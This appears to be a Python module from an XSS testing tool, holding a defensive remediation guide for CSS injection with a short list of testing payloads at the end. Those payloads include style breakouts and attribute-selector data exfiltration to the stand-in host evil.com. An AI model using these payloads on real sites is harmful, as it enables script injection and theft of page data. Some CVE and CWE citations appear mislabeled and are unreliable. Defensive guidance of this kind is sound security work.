#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

CSS Context - Remediation
"""

REMEDIATION = """
DEFENSE-IN-DEPTH STRATEGY:

1. NEVER PLACE UNTRUSTED INPUT IN CSS:
   
   BAD:
   <style>div {color: <?php echo $user_color ?>}</style>
   <div style="background: <?php echo $user_bg ?>">
   
   GOOD:
   Use predefined CSS classes:
   <div class="theme-<?php echo htmlspecialchars($safe_theme_id) ?>">

2. STRICT CSS CHARACTER ESCAPING:
   
   Escape these characters:
   - { } ; : ( ) " ' \\ / < > & = + * ! @ # $ % ^ `
   
   Python:
   import re
   def escape_css(text):
       # Allow only safe characters
       return re.sub(r'[^a-zA-Z0-9\\s\\-]', '', text)
   
   PHP:
   function escape_css($text) {
       return preg_replace('/[^a-zA-Z0-9\\s\\-]/', '', $text);
   }
   
   JavaScript:
   function escapeCSS(text) {
       return text.replace(/[^a-zA-Z0-9\\s\\-]/g, '');
   }

3. WHITELIST APPROACH:
   
   For colors:
   $allowed_colors = ['red', 'blue', 'green', 'black', 'white'];
   if (!in_array($user_color, $allowed_colors)) {
       $user_color = 'black'; // Default
   }
   
   For URLs:
   if (!preg_match('/^https:\\/\\/trusted-domain\\.com\\//', $url)) {
       die('Invalid URL');
   }

4. CONTENT SECURITY POLICY:
   
   Restrict inline styles:
   Content-Security-Policy: 
     style-src 'self' 'nonce-RANDOM123';
   
   Block external stylesheets:
   Content-Security-Policy:
     style-src 'self';
   
   No inline styles at all:
   Content-Security-Policy:
     style-src 'self';  // No 'unsafe-inline'

5. CSS SANITIZATION LIBRARIES:
   
   JavaScript (DOMPurify with CSS):
   import DOMPurify from 'dompurify';
   const clean = DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: ['style'],
       ALLOWED_ATTR: []
   });
   
   Python (Bleach):
   import bleach
   from bleach.css_sanitizer import CSSSanitizer
   
   css_sanitizer = CSSSanitizer(
       allowed_css_properties=['color', 'background-color'],
       allowed_protocols=['https']
   )
   clean = bleach.clean(
       dirty,
       tags=['style'],
       css_sanitizer=css_sanitizer
   )

6. BLOCK DANGEROUS CSS PROPERTIES:
   
   Dangerous properties to remove/block:
   - expression (IE)
   - behavior (IE)
   - -moz-binding (Firefox)
   - @import
   - @font-face (in user CSS)
   - url() with javascript:, data:, vbscript:
   - position: fixed (for overlays)
   - opacity: 0 (for clickjacking)
   - z-index > reasonable value

7. VALIDATE CSS VALUES:
   
   For colors (hex):
   if (!preg_match('/^#[0-9A-Fa-f]{6}$/', $color)) {
       $color = '#000000';
   }
   
   For colors (rgb):
   if (!preg_match('/^rgb\\(\\d{1,3},\\d{1,3},\\d{1,3}\\)$/', $color)) {
       $color = 'rgb(0,0,0)';
   }
   
   For dimensions:
   if (!preg_match('/^\\d+px$/', $size)) {
       $size = '0px';
   }

8. CSS-IN-JS PROTECTION:
   
   Styled-components (use CSS prop safely):
   const UserDiv = styled.div`
     color: ${props => CSS.escape(props.userColor)};
   `;
   
   Or use style object (safer):
   <div style={{
     color: sanitizeColor(userInput)  // Validate first
   }}>
   
   Emotion:
   const styles = css`
     color: ${CSS.escape(userColor)};
   `;

9. DISABLE ATTRIBUTE SELECTORS (If possible):
   
   In controlled environments, restrict CSS features:
   - No [attribute^=value] selectors
   - No @font-face in user CSS
   - No url() in user CSS
   - No @import

10. INPUT VALIDATION:
    
    For theme selection:
    $theme_id = intval($_POST['theme']);
    if ($theme_id < 1 || $theme_id > 10) $theme_id = 1;
    
    For custom colors:
    - Accept only hex colors: #RRGGBB
    - OR provide color picker with limited palette
    - Never allow raw CSS

SECURITY CHECKLIST:

[ ] No user input placed directly in <style> tags
[ ] No user input in style attributes without escaping
[ ] CSS character escaping implemented
[ ] Whitelist approach for colors/values
[ ] CSP configured to restrict inline styles
[ ] CSS sanitization library used (DOMPurify, Bleach)
[ ] Dangerous CSS properties blocked
[ ] URL validation for background/import
[ ] No expression, behavior, -moz-binding allowed
[ ] Attribute selectors restricted (prevent keyloggers)
[ ] @font-face controlled or blocked
[ ] CSS-in-JS properly escaped
[ ] Input validation for expected formats
[ ] Regular security testing
[ ] Code review for all CSS generation

TESTING PAYLOADS:

Style breakout:
red}body{background:url(//evil.com)
red"></div><img src=x onerror=alert(1)><div x="

Attribute selector:
input[value^="a"] {background: url(//evil.com?c=a)}

Font-face:
@font-face {src: url(//evil.com)}

Import:
@import url(//evil.com/evil.css)

Expression (legacy):
expression(alert(1))

URL injection:
url(javascript:alert(1))
url(data:text/html,<script>alert(1)</script>)

TOOLS:
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- DOMPurify: https://github.com/cure53/DOMPurify
- Bleach: https://github.com/mozilla/bleach
- CSS Sanitizer spec: https://drafts.csswg.org/css-syntax-3/

RESEARCH REFERENCES:
- "CSS Injection Primitives" by Gareth Heyes
- "CSS Exfiltration" by Mike Gualtieri
- "CSS Keylogger" by Max Chehab
- "Stealing Data with CSS" by Michele Spagnuolo
- OWASP XSS Prevention Cheat Sheet

CVE REFERENCES:
- CVE-2019-8773: Safari CSS expression
- CVE-2021-21290: CSS injection in Netty
- Various CSS injection in email clients

OWASP REFERENCES:
- OWASP XSS Prevention Cheat Sheet: Rule #4
- CWE-79: Cross-site Scripting
- CWE-1275: Sensitive Cookie with Improper SameSite Attribute
"""

